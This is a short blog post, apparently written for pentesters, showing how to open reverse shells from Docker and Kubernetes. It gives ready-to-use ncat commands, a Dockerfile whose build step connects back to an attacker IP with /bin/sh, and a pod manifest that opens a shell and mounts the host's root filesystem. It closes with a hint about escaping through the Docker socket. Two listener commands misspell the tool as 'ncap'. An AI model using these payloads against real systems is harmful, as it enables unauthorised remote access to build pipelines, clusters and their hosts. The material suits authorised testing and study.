---
layout: post
title: "Docker and Kubernetes Reverse shells"
date: 2019-08-09 10:10:39 +0100
comments: false
categories: Docker
---

A handy technique for any pentester is the ability to create a reverse shell. This allows for a variety of cases where you want to get access to restricted environments or want to extract information from a remote system.

There's a number of scenarios where this can apply to containerized environments, here's a couple with the steps that could be used to setup a reverse shell using [ncat](https://nmap.org/ncat/)

## Reverse shell from docker run

Here we want to push a reverse shell back from a machine that we have `docker run` access to, this one is pretty simple

**Pentester Machine - 192.168.200.1**
We just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection

```
ncat -l -p 8989
```

**Target Machine**
Here we just need a Docker image that has ncat available. I've got one [here](https://cloud.docker.com/u/raesene/repository/docker/raesene/ncat) on Docker hub.

So we just run this image with ncat parameters to connect back to the pentester machine on 192.168.200.1

```
docker run raesene/ncat 192.168.200.1 8989 -e /bin/sh
```

## Reverse Shell from a Dockerfile

So in our next scenario we've got the ability to get our Target Machine to do a `docker build` on a `Dockerfile` that we control.  This is common in places where there are CI/CD processes like Jenkins or Drone, or cloud container building services.

**Pentester Machine - 192.168.200.1**
Same as last time, we just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection

```
ncap -l -p 8989
```

**Target Machine**

Here we need to construct our Dockerfile to pass into the process, this one should work based on a base ubuntu:18.04 image

```
FROM ubuntu:18.04

RUN apt update && apt install -y nmap

RUN ncat 192.168.200.1 8989 -e /bin/sh

CMD ["/bin/bash"]
```

when the `docker build` command is executed, the reverse shell will pop during the build process.

## Kubernetes Cluster

So say you've got a Kubernetes cluster where you can create pods but otherwise your rights are limited, and you'd like to get a shell inside the cluster.

**Pentester Machine - 192.168.200.1**
Same as last time, we just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection

```
ncap -l -p 8989
```

**Target Cluster**

So we just need a Pod manifest that will open a reverse shell on your pentester machine when created.  The example below will create that kind of pod and additionally will mount the hosts root filesystem into `/host`, although this will fail if a restrictive `PodSecurityPolicy` is in place.

```
apiVersion: v1
kind: Pod
metadata:
  name: ncat-reverse-shell-pod
  labels:
    app: ncat
spec:
  containers:
  - name: ncat-reverse-shell
    image: raesene/ncat
    volumeMounts:
    - mountPath: /host
      name: hostvolume
    args: ['192.168.200.1', '8989', '-e', '/bin/bash']
  volumes:
  - name: hostvolume
    hostPath:
      path: /
      type: Directory
```

For extra credit you could mount in the Docker socket from the underlying host and then break out relatively easily